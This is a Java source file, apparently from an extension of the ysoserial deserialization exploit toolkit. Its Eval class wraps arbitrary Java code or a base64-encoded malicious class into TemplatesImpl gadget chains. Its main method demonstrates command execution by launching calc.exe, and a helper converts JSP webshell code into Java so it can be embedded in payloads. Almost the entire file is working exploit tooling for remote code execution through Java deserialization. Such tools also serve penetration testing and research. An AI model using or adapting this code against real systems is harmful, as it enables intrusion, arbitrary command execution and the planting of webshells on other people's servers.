package ysoserial.payloads;

import javassist.ClassPool;
import javassist.CtClass;
import ysoserial.Deserializer;
import ysoserial.Serializer;

import java.util.Base64;
import java.util.regex.Matcher;
import java.util.regex.Pattern;

public class Eval {
    public static void main(String[] args) throws Exception{
        String code = "Runtime.getRuntime().exec(\"calc.exe\");";
        Object o = new Eval().getObject(RomeTools.class,code);
//        Object o = new Eval().getObject(RomeTools.class, Fuck.class);
        byte[] ser = Serializer.serialize(o);

        Deserializer.deserialize(ser);
    }
    public Object getObject(Class gadget,String code) throws Exception {
        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(gadget.getName());
        byte[] bytes = clazz.toBytecode();
        String s = new String(bytes);
        if(!s.contains("createTemplatesImpl")){
            throw new Exception("[!] The Gadget must use TemplatesImpl");
        }
        ObjectPayload o = (ObjectPayload)gadget.newInstance();
        return o.getObject("CODE;" + code);
    }
    public Object getObject(Class gadget,Class evilClass) throws Exception {

        final Class superClass = evilClass.getSuperclass();

        if (!superClass.getName().equals("com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet")) {
            throw new Exception("[!] evilClass must extend from com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet.");
        }

        ClassPool pool = ClassPool.getDefault();
        CtClass clazz = pool.get(gadget.getName());
        byte[] bytes = clazz.toBytecode();
        String s = new String(bytes);
        if(!s.contains("createTemplatesImpl")){
            throw new Exception("[!] The Gadget must use TemplatesImpl");
        }
        ObjectPayload o = (ObjectPayload)gadget.newInstance();

        pool = ClassPool.getDefault();
        clazz = pool.get(evilClass.getName());
        bytes = clazz.toBytecode();

        s = new String(bytes);
        if(s.contains(evilClass.getName().replace(".","/") + "$")){
            throw new Exception("[!] Do not use inner class or anonymous class in evilClass.");
        }
        String b = new String(Base64.getEncoder().encode(bytes));

        return o.getObject("CLASS;" + b);
    }
    public static String getJavaCodeFromJSP(String jspcode) throws Exception{
        String code = jspcode;
        while (true){
            code = code.trim();
            int end = code.indexOf("%>");
            int i;
            if (code.startsWith("<%--")){
                code = code.substring(end+2);
                continue;
            }else if(code.startsWith("<%@")){
                Pattern pattern = Pattern.compile("<%\\@\\s+page import=\"(.*)\" %>");
                Matcher matcher = pattern.matcher(code);
                code = code.substring(end+2);
                if(matcher.find()) {
                    String s = matcher.group(1);
                    code = code.replaceAll("([^\\.\\w]+)"+s.substring(s.lastIndexOf(".") + 1) + "([^\\w]+)","$1"+s+"$2");
                }
                continue;
            }
            else if(code.startsWith("<jsp:directive.")
                || code.startsWith("<%!")
                || code.startsWith("<jsp:declaration")
                || code.startsWith("<%=")
                || code.startsWith("<jsp:expression")
            ) {
                code = code.substring(end+2);
                continue;
            }else if (code.startsWith("<%")) {
                code = code.substring(2,end);
                break;
            }else {
                return null;
            }
        }
        code = code.replaceAll("([^\\.\\w]+)"+"(AsyncContext|AsyncEvent|AsyncListener|DispatcherType|Filter|FilterChain|FilterConfig|FilterRegistration|GenericFilter|GenericServlet|HttpConstraintElement|HttpMethodConstraintElement|MultipartConfigElement|ReadListener|Registration|RequestDispatcher|Servlet|ServletConfig|ServletContainerInitializer|ServletContext|ServletContextAttributeEvent|ServletContextAttributeListener|ServletContextEvent|ServletContextListener|ServletException|ServletInputStream|ServletOutputStream|ServletRegistration|ServletRequest|ServletRequestAttributeEvent|ServletRequestAttributeListener|ServletRequestEvent|ServletRequestListener|ServletRequestWrapper|ServletResponse|ServletResponseWrapper|ServletSecurityElement|SessionCookieConfig|SessionTrackingMode|SingleThreadModel|UnavailableException|WriteListener)"+ "([^\\w]+)","$1"+"javax.servlet."+"$2"+"$3");

        code = code.replaceAll("([^\\.\\w]+)"+"(Cookie|CookieNameValidator|HttpFilter|HttpServlet|HttpServletMapping|HttpServletRequest|HttpServletRequestWrapper|HttpServletResponse|HttpServletResponseWrapper|HttpSession|HttpSessionActivationListener|HttpSessionAttributeListener|HttpSessionBindingEvent|HttpSessionBindingListener|HttpSessionContext|HttpSessionEvent|HttpSessionIdListener|HttpSessionListener|HttpUpgradeHandler|HttpUtils|MappingMatch|Part|PushBuilder|RFC2109Validator|RFC6265Validator|WebConnection)"+ "([^\\w]+)","$1"+"javax.servlet.http."+"$2"+"$3");

        return code;
    }

}
